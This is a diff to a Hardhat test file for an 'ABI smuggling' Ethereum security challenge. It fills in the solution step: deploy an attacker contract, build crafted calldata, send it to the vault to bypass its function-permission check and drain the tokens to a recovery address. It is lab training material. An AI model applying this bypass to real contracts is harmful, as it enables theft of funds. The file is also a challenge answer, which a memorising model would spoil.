@@ -1,9 +1,10 @@
-const { ethers } = require('hardhat');
+const { ethers } = require('hardhat'); 
 const { expect } = require('chai');
 
 describe('[Challenge] ABI smuggling', function () {
     let deployer, player, recovery;
     let token, vault;
+    let attack;
     
     const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;
 
@@ -19,7 +20,9 @@ describe('[Challenge] ABI smuggling', function () {
         expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);
 
         // Set permissions
+        // 0x85fb709d == sweepFunds(address,address)
         const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
+        // 0xd9caed12 == withdraw(address,address,uint256)
         const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
         await vault.setPermissions([deployerPermission, playerPermission]);
         expect(await vault.permissions(deployerPermission)).to.be.true;
@@ -44,7 +47,14 @@ describe('[Challenge] ABI smuggling', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const AttackFactory = await ethers.getContractFactory('AttackA', player);
+        attack = await AttackFactory.connect(player).deploy(vault.address,token.address,player.address);
+
+        let param = await attack.connect(player).callStatic.kek();
+        //console.log("param = ", param);
+        await player.sendTransaction({to: vault.address, data: param});
+        //console.log("player balance = ", (await token.balanceOf(player.address)).div(10n**18n));
+        await token.connect(player).transfer(recovery.address,VAULT_TOKEN_BALANCE);
     });
 
     after(async function () {
